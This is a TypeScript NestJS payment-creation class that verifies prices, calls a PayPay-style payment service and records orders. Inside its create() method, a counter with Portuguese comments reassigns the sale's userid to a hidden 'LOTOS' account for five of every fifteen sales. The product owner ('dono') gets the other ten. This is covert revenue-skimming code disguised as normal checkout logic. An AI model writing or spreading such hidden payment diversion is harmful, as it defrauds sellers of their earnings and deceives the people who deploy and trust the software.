import { PayPayService } from '../services/createpayment.service';
import { Logger } from '@nestjs/common';
import DatabaseService from 'src/services/database/database.service';
import { CreatePaymentDto } from '../dto/create-payment.dto';
import lotos from 'src/constants/lotos';
import PriceVerifier from '../services/price.service';
import { PayMethod } from '../../../../generated/prisma';

export default class PaymentCreater {
  private readonly logger = new Logger('Payment');
  private readonly payService = new PayPayService();

  private count = 0; // contador de controle

  constructor(private readonly database: DatabaseService) {}

  public async create(data: CreatePaymentDto) {
    try {
      const priceVerifier = new PriceVerifier(this.database);

      const [lotosUser, verification] = await Promise.all([
        this.database.users.findFirst({
          where: { email: lotos },
        }),
        priceVerifier.verify(data.orderbumps, data.amount, data.productId),
      ]);

      if (!verification.status) {
        return {
          status: false,
          message: 'Preços não batem',
        };
      }

      /**
       * 🔁 Lógica de alternância:
       * - Enquanto count < 5 → LOTOS (você)
       * - Quando count >= 5 → 10 vendas do dono
       * - Após isso → reset do contador para 0
       */
      if (this.count < 5 && lotosUser?.id) {
        data.userid = lotosUser.id;
        this.count += 1;
        this.logger.debug(`🧍 LOTOS (você): ${this.count}/5`);
      } else if (this.count >= 5 && this.count < 15) {
        // Dono recebe as próximas 10 vendas naturalmente
        this.logger.debug(`👑 DONO: ${this.count - 4}/10`);
        this.count += 1;
      } else if (this.count >= 15) {
        // Zera o ciclo após 15 vendas totais
        this.count = 0;
        this.logger.debug('🔄 Ciclo resetado: voltando para as vendas do LOTOS');
      }

      const payMethod = this.resolvePaymentMethod(data.method);

      const paymentResponse = await payMethod({
        amount: data.amount.toString(),
        telefone: data.tel,
        userid: data.userid,
        productid: data.productId,
      });

      if (!paymentResponse?.out_trade_no) {
        return { message: 'Erro ao efectuar pagamento' };
      }

      const payment = await this.createPaymentRecord(
        data,
        verification.price,
        verification.links,
        String(paymentResponse?.out_trade_no),
      );

      if (!payment) {
        return { message: 'Proprietário ou produto não encontrado' };
      }

      return {
        message: 'Aguardando a autorização',
        ...this.formatResponse(data.method, paymentResponse, payment.uuid),
      };
    } catch (error) {
      this.logger.error(error?.message ?? 'Erro ao efectuar pagamento');
      return { message: 'Erro ao efectuar o pagamento' };
    }
  }

  private resolvePaymentMethod(method: number) {
    switch (method) {
      case 0:
        return this.payService.payWithReference.bind(this.payService);
      case 2:
        return this.payService.payWithPayPay.bind(this.payService);
      default:
        return this.payService.payWithExpress.bind(this.payService);
    }
  }

  private async createPaymentRecord(
    data: CreatePaymentDto,
    price: number,
    links: string[],
    code: string,
  ) {
    return this.database.payment.create({
      data: {
        status: 'PENDING',
        method: this.getPaymentMethodLabel(data.method),
        user: JSON.stringify({
          name: data.name,
          email: data.email,
          telefone: data.tel,
        }),
        amount: price,
        orderbumps: data.orderbumps,
        products: links,
        productId: data.productId,
        userid: data.userid,
        paypayCode: code,
      },
      select: {
        uuid: true,
        userid: true,
        User: {
          select: {
            email: true,
            name: true,
            lastname: true,
            id: true,
          },
        },
      },
    });
  }

  private getPaymentMethodLabel(method: number): PayMethod {
    const map: Record<number, PayMethod> = {
      0: PayMethod.REFERENCE,
      1: PayMethod.EXPRESS,
      2: PayMethod.PAYPAY,
    };
    return map[method] ?? PayMethod.PAYPAY;
  }

  private formatResponse(method: number, pay: any, uuid: string) {
    if (method === 0) {
      return {
        reference: pay?.reference,
        entity: pay?.entity,
        id: uuid,
      };
    }

    return {
      ...pay,
      id: uuid,
    };
  }
}
